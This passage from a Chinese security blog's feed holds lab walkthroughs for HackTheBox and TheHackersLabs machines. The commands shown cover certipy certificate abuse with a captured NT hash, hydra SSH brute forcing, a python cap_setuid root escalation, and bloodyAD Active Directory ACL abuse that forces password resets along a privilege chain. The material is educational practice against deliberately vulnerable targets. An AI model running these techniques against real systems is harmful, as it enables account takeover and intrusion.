```bash
➜  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

`root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
7d69ba1c8bb2ee23ff27f0e1610caa3b
```

## 总结

任重道远，不会的还是多…比如利用`certutil`来导出证书这一点，以及文件上传的`ZipSlip` ，总的也是学习到了新东西]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>GoldenCertificate</category>
            <category>seManageVolumePrivilegem</category>
            <category>ZipSlip</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Tortuga]]></title>
            <link>https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga</guid>
            <pubDate>Wed, 01 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Tortuga https://labs.thehackerslabs.com/machine/131 Recon PortScan 枚举 HTTP 页面中的两个链接 “grumete 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户 目录扫描无结果 进行 ssh 爆破 得到密码 1234 进去后能读...]]></description>
            <content:encoded><![CDATA[
# Tortuga

> https://labs.thehackerslabs.com/machine/131
> 

![image.png](/post-images/TheHackersLabsTortuga/image.png)

## Recon

### PortScan

```bash
➜  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST
Nmap scan report for 192.168.56.120
Host is up (0.00076s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.92 seconds
```

```bash
➜  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST
Nmap scan report for 192.168.56.120
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)
|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Isla Tortuga
MAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.56.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds
```

### 枚举

HTTP

![image.png](/post-images/TheHackersLabsTortuga/image1.png)

页面中的两个链接

```bash
La Tripulación de Tortuga 海龟船员

    Capitán Barbanegra – Estratega implacable. 黑胡子船长 – 无情的战略家。
    Corsario Rojo – Maestro de la espada.
    红色海盗船 – 剑之大师。
    Grumete Verde – Aprendiz despistado. 绿色小屋男孩 – 心不在焉的学徒。
    Timón de Hierro – El que nunca pierde el rumbo.
    铁舵——永不迷路的人。

"Quien domine el timón hallará el rumbo a la victoria..."
“谁主宰舵，谁就会找到胜利之路......”

"Recuerda: el viejo truco de las rutas dobles siempre funciona..."
“记住：双路线的老把戏总是有效的......”
```

```bash
Mapa de Isla Tortuga 托尔图加岛地图

~~~~~~~~~~~~~~~~~~~
~     PIRATE BAY   ~
~~~~~~~~~~~~~~~~~~~
       |   |
       |   |    X  (tesoro enterrado)
       |   |
~~~~~~~~~~~~~~~~~~~
~     PUERTO       ~
~~~~~~~~~~~~~~~~~~~
    

Una nota arrugada se lee en la esquina del mapa...
地图的角落里写着一张皱巴巴的纸条......

"Ey grumete revisa la nota oculta que dejado en tu camarote..."
“嘿，船舱男孩，检查一下我留在你船舱里的隐藏纸条......”
```

“`grumete` 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户

目录扫描无结果

```bash
➜  Tortuga gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.120/grumete
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

进行 `ssh` 爆破

```bash
➜  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 17:10:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.120:22/
[STATUS] 121.00 tries/min, 121 tries in 00:01h, 14344278 to do in 1975:48h, 8 active
[STATUS] 120.00 tries/min, 360 tries in 00:03h, 14344039 to do in 1992:14h, 8 active
[STATUS] 121.29 tries/min, 849 tries in 00:07h, 14343550 to do in 1971:03h, 8 active
[22][ssh] host: 192.168.56.120   login: grumete   password: 1234
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 17:19:48
```

得到密码 `1234`

进去后能读取 user.txt

```bash
grumete@TheHackersLabs-Tortuga:~$ cat user.txt 
c3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 权限提升

### 信息收集

家目录下 `.nota.txt` 得到一个密码 `mar_de_fuego123`

```
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días.
Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos.

La puerta de la cámara del timón está asegurada con la contraseña:
    "mar_de_fuego123"

Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años
navegando juntos, y eres en quien más confío en estos mares traicioneros.

Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron
para hacer carreras de tortugas otra vez!).

Con la confianza de siempre,
— El Capitán
```

是用户 capitan 的密码

![image.png](/post-images/TheHackersLabsTortuga/image2.png)

上传 `linepas` 扫一波，发现 python 设置了特殊权限

![image.png](/post-images/TheHackersLabsTortuga/image3.png)

- **`setcap`**: 这是用来设置文件 Capabilities 的命令。
- **`cap_setuid`**: 这是要授予的具体能力。`CAP_SETUID` 允许一个进程改变其 UID（用户ID）。这是 SUID (Set User ID) 权限的核心能力。拥有这个能力的进程可以调用 `setuid(0)` 来将自己变成 root 用户。
- **`=ep`**: 这指定了要将 `cap_setuid` 添加到哪些 Capability 集合中。
    - **`e` (Effective)**: 有效集合。表示当程序运行时，这个能力**立即生效**。这是提权的关键。
    - **`p` (Permitted)**: 许可集合。表示程序被**允许**拥有这个能力，即使它暂时没有使用。
- **`/usr/bin/python3.11`**: 这是被赋予能力的目标文件，即 Python 3.11 的可执行程序。

```bash
capitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Tortuga:/tmp# 
```

读取 root.txt

```bash
root@TheHackersLabs-Tortuga:/root# cat root.txt 
c3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>Brute</category>
            <category>Cappbilities</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Elevator]]></title>
            <link>https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator</guid>
            <pubDate>Mon, 29 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Elevator https://labs.thehackerslabs.com/machine/126 作者给了一个账户 Recon PortScan 枚举 SMB 枚举，下载了一些文件，不过都是没什么用的 查看一下用户权限 上 bloodhound 横向移动 ADDSelf 允许 john.sm...]]></description>
            <content:encoded><![CDATA[
# Elevator

> https://labs.thehackerslabs.com/machine/126
> 

![image.png](/post-images/TheHackersLabsElevator/image.png)

作者给了一个账户

```bash
User john.smith
Password Rk436\#Z4&
```

## Recon

### PortScan

```bash
➜  ~ nmap -sP 10.0.250.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:20 CST
Nmap scan report for 10.0.250.1
Host is up (0.00072s latency).
MAC Address: 08:00:27:8F:2A:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.3
Host is up (0.00057s latency).
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.4
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 28.12 seconds
```

```bash
➜  ~ nmap -sT -min-rate 10000 -p- 10.0.250.3    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:21 CST
Strange read error from 10.0.250.3 (104 - 'Connection reset by peer')
Nmap scan report for 10.0.250.3
Host is up (0.00098s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49680/tcp open  unknown
49687/tcp open  unknown
49692/tcp open  unknown
49711/tcp open  unknown
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
➜  ~ nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 10.0.250.3     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:24 CST
Nmap scan report for 10.0.250.3
Host is up (0.00070s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 06:24:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -38s
| smb2-time: 
|   date: 2025-09-29T06:24:37
|_  start_date: N/A
|_nbstat: NetBIOS name: ELEVATOR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 10.0.250.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.85 seconds
```

### 枚举

SMB 枚举，下载了一些文件，不过都是没什么用的

![image.png](/post-images/TheHackersLabsElevator/image1.png)

查看一下用户权限

```bash
➜  Elevator nxc ldap 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&'
LDAP        10.0.250.3      389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)
LDAP        10.0.250.3      389    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4&

➜  Elevator nxc winrm 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&'
WINRM       10.0.250.3      5985   ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.0.250.3      5985   ELEVATOR         [-] bloodhound.thl\john.smith:Rk436\#Z4& 
```

上 `bloodhound`

```bash
➜  Elevator bloodhound-python -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' -c all --zip -dc bloodhound.thl -ns 10.0.250.3
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: bloodhound.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: bloodhound.thl
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: bloodhound.thl
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 4 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: elevator.bloodhound.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250929144249_bloodhound.zip
```

## 横向移动

### ADDSelf

允许 `john.smith` 将自己添加到 `Finanzas` 组中

![image.png](/post-images/TheHackersLabsElevator/image2.png)

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
[+] john.smith added to FINANZAS
```

### Force Change Password

然后 `FINANZAS` 组队 `MARY.JOHNSON` 用户有 `GenericAll` 权限

![image.png](/post-images/TheHackersLabsElevator/image3.png)

直接修改其密码

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&' set password mary.johnson admin12345
[+] Password changed successfully!
```

接着 `MARY.JOHNSON` 又可以修改 `ROBERT.WILLIAMS` 的密码

![image.png](/post-images/TheHackersLabsElevator/image4.png)

```bash
	➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'mary.johnson' -p 'admin12345' set password ROBERT.WILLIAMS admin12345
[+] Password changed successfully!
```

### WriteDACL 滥用

`ROBERT.WILLIAMS` 拥有对 `PATRICIA.BROWN` 的 `WriteDacl` 权限

![image.png](/post-images/TheHackersLabsElevator/image5.png)

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl
permission: WRITE

distinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl
permission: WRITE

distinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl
DACL: WRITE
```

要将 WriteDacl 滥用到用户对象，您可以授予自己 GenericAll 权限

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS
[+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN
```

再强制修改其密码

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' set password PATRICIA.BROWN admin12345
[+] Password changed successfully!
```

### ADDSelf - 2

用户 `PATRICIA.BROWN@BLOODHOUND.THL` 有权修改组 `OPERACIONES@BLOODHOUND.THL` 的所有者

![image.png](/post-images/TheHackersLabsElevator/image6.png)

那么就将其的所有者修改为自己，然后再将自己添加进去

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set owner OPERACIONES PATRICIA.BROWN
[+] Old owner S-1-5-21-3580157585-956322742-780763674-512 is now replaced by PATRICIA.BROWN on OPERACIONES
```

```bash
➜  Elevator dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'admin12345'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250929-155416.bak
[*] DACL modified successfully!
```

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' add groupMember OPERACIONES PATRICIA.BROWN
[+] PATRICIA.BROWN added to OPERACIONES
```

到这里卡住了，因为没有任何路径，SMB 也枚举过了，故查看 WP，发现 `OPERACIONES` 应该对 Jones 有 `genericAll` 权限的，但是我这里没有，询问了佬们得知是需要重新导入

### Force Change Password - 2

重新导入后，可以看到对 `Jones` 有权限了

![image.png](/post-images/TheHackersLabsElevator/image7.png)

所以是一条路径下来的

![image.png](/post-images/TheHackersLabsElevator/image8.png)

强制修改密码

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set password MICHAEL.JONES admin12345
[+] Password changed successfully!
```

给自己 `jones` 添加到远程组里

```bash
➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'MICHAEL.JONES' -p 'admin12345' add groupMember 'Usuarios de administración remota' MICHAEL.JONES
[+] MICHAEL.JONES added to Usuarios de administración remota
```

使用 `evil-winrm` 进行登录

![image.png](/post-images/TheHackersLabsElevator/image9.png)

```bash
*Evil-WinRM* PS C:\Users\administrador\desktop> type root.txt
axxxxxxxxxxxxxxxxxxxxxxxxxxx6
*Evil-WinRM* PS C:\Users\administrador\desktop> type user.txt
bxxxxxxxxxxxxxxxxxxxxxxxxxxxe
```

## 总结

爽？]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Pa Que Aiga Lujo]]></title>
            <link>https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo</guid>
            <pubDate>Sun, 28 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Pa Que Aiga Lujo https://labs.thehackerslabs.com/machine/125 Recon PortScan 枚举 HTTP 目录扫描 好一会没找到利用的点，但是可以注意到网页上有好几个用户名，收集起来尝试暴力破解 得到密码 dolphins 提权 cipo...]]></description>
            <content:encoded><![CDATA[
# Pa Que Aiga Lujo

> https://labs.thehackerslabs.com/machine/125
> 

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image.png)

## Recon

### PortScan

```bash
➜  PaQueAigaLujo nmap -sP 192.168.56.0/24  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:36 CST
Nmap scan report for 192.168.56.1
Host is up (0.00053s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00041s latency).
MAC Address: 08:00:27:E9:F5:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.118
Host is up (0.00047s latency).
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
➜  PaQueAigaLujo nmap -sT -min-rate 10000 -p- 192.168.56.118  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST
Nmap scan report for 192.168.56.118
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```

```bash
➜  PaQueAigaLujo nmap -sT -A -p 22,80 192.168.56.118                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST
Nmap scan report for 192.168.56.118
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: LuxeCollection - Art\xC3\xADculos de Lujo Exclusivos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.56.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.62 seconds
```

### 枚举

HTTP

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image1.png)

目录扫描

```bash
➜  PaQueAigaLujo feroxbuster --url http://192.168.56.118 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.118
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      168l      285w     2899c http://192.168.56.118/styles/components.css
200      GET      221l      524w     5600c http://192.168.56.118/scripts/main.js
200      GET      230l      445w     4172c http://192.168.56.118/styles/main.css
200      GET      231l      411w     3799c http://192.168.56.118/styles/responsive.css
301      GET        9l       28w      318c http://192.168.56.118/scripts => http://192.168.56.118/scripts/
301      GET        9l       28w      317c http://192.168.56.118/styles => http://192.168.56.118/styles/
200      GET      285l      778w    15656c http://192.168.56.118/
[####################] - 50s   220557/220557  0s      found:7       errors:0      
[####################] - 50s   220545/220545  4429/s  http://192.168.56.118/ 
[####################] - 0s    220545/220545  16965000/s http://192.168.56.118/scripts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    220545/220545  13784062/s http://192.168.56.118/styles/ => Directory listing (add --scan-dir-listings to scan)
```

好一会没找到利用的点，但是可以注意到网页上有好几个用户名，收集起来尝试暴力破解

```bash
Carlos
Isabella
Alexandre
Miguel
Elena
Victoria
Anastasia
Sophia
James
Roberto
Catherine
Valentina
Priscilla
Beatrice
Margot
Alessandro
Marcus
Diego
Winston
Maximilian
carlos
isabella
alexandre
miguel
elena
victoria
anastasia
sophia
james
roberto
catherine
valentina
priscilla
beatrice
margot
alessandro
marcus
diego
winston
maximilian
```

得到密码 `dolphins`

```bash
➜  PaQueAigaLujo hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.118 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 11:31:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 301232379 login tries (l:21/p:14344399), ~37654048 tries per task
[DATA] attacking ssh://192.168.56.118:22/
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 301232243 to do in 36915:43h, 8 active
[STATUS] 129.67 tries/min, 389 tries in 00:03h, 301231990 to do in 38718:46h, 8 active
[STATUS] 132.57 tries/min, 928 tries in 00:07h, 301231451 to do in 37870:20h, 8 active
[STATUS] 130.93 tries/min, 1964 tries in 00:15h, 301230415 to do in 38343:60h, 8 active
[STATUS] 132.19 tries/min, 4098 tries in 00:31h, 301228281 to do in 37978:12h, 8 active
[STATUS] 132.23 tries/min, 6215 tries in 00:47h, 301226164 to do in 37966:18h, 8 active
[STATUS] 132.21 tries/min, 8329 tries in 01:03h, 301224050 to do in 37973:59h, 8 active
[ssh] host: 192.168.56.118   login: Sophia   password: dolphins
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image2.png)

## 提权 - cipote

### 信息收集

查看监听端口和IP 地址

```bash
Sophia@TheHackersLabs-PaQueAigaLujo:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                         127.0.0.1:38225                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       511                                                  *:80                                                   *:*                                              
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              
Sophia@TheHackersLabs-PaQueAigaLujo:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
